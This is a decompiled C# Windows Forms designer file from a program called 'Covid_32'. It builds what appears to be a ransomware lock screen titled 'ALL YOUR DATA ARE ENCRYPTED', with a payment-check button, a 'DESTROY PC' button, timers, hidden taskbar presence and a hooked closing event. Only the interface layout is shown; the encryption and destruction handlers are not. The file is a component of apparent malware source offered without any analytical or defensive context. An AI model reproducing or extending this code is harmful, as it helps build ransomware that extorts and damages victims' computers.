﻿namespace Covid_32
{
	// Token: 0x02000003 RID: 3
	public partial class Form1 : global::System.Windows.Forms.Form
	{
		// Token: 0x06000013 RID: 19 RVA: 0x000022CC File Offset: 0x000004CC
		protected override void Dispose(bool disposing)
		{
			bool flag = disposing && this.components != null;
			if (flag)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002304 File Offset: 0x00000504
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Covid_32.Form1));
			this.button1 = new global::System.Windows.Forms.Button();
			this.label1 = new global::System.Windows.Forms.Label();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.timer2 = new global::System.Windows.Forms.Timer(this.components);
			this.button2 = new global::System.Windows.Forms.Button();
			this.timer3 = new global::System.Windows.Forms.Timer(this.components);
			base.SuspendLayout();
			this.button1.BackColor = global::System.Drawing.Color.Black;
			this.button1.ForeColor = global::System.Drawing.Color.Red;
			this.button1.Location = new global::System.Drawing.Point(12, 305);
			this.button1.Name = "button1";
			this.button1.Size = new global::System.Drawing.Size(506, 48);
			this.button1.TabIndex = 0;
			this.button1.Text = "Decrypt And check payment";
			this.button1.UseVisualStyleBackColor = false;
			this.button1.Click += new global::System.EventHandler(this.button1_Click);
			this.label1.AutoSize = true;
			this.label1.Location = new global::System.Drawing.Point(8, 9);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(496, 280);
			this.label1.TabIndex = 1;
			this.label1.Text = componentResourceManager.GetString("label1.Text");
			this.label1.Click += new global::System.EventHandler(this.label1_Click);
			this.timer1.Tick += new global::System.EventHandler(this.timer1_Tick);
			this.timer2.Tick += new global::System.EventHandler(this.timer2_Tick);
			this.button2.BackColor = global::System.Drawing.Color.Red;
			this.button2.ForeColor = global::System.Drawing.Color.Black;
			this.button2.Location = new global::System.Drawing.Point(12, 359);
			this.button2.Name = "button2";
			this.button2.Size = new global::System.Drawing.Size(506, 45);
			this.button2.TabIndex = 2;
			this.button2.Text = "DESTROY PC";
			this.button2.UseVisualStyleBackColor = false;
			this.button2.Click += new global::System.EventHandler(this.button2_Click);
			this.timer3.Tick += new global::System.EventHandler(this.timer3_Tick);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(9f, 20f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.Red;
			base.ClientSize = new global::System.Drawing.Size(530, 416);
			base.Controls.Add(this.button2);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.button1);
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "Form1";
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			this.Text = "ALL YOUR DATA ARE ENCRYPTED";
			base.FormClosing += new global::System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
			base.Load += new global::System.EventHandler(this.Form1_Load);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000006 RID: 6
		private global::System.ComponentModel.IContainer components = null;

		// Token: 0x04000007 RID: 7
		private global::System.Windows.Forms.Button button1;

		// Token: 0x04000008 RID: 8
		private global::System.Windows.Forms.Label label1;

		// Token: 0x04000009 RID: 9
		private global::System.Windows.Forms.Timer timer1;

		// Token: 0x0400000A RID: 10
		private global::System.Windows.Forms.Timer timer2;

		// Token: 0x0400000B RID: 11
		private global::System.Windows.Forms.Button button2;

		// Token: 0x0400000C RID: 12
		private global::System.Windows.Forms.Timer timer3;
	}
}
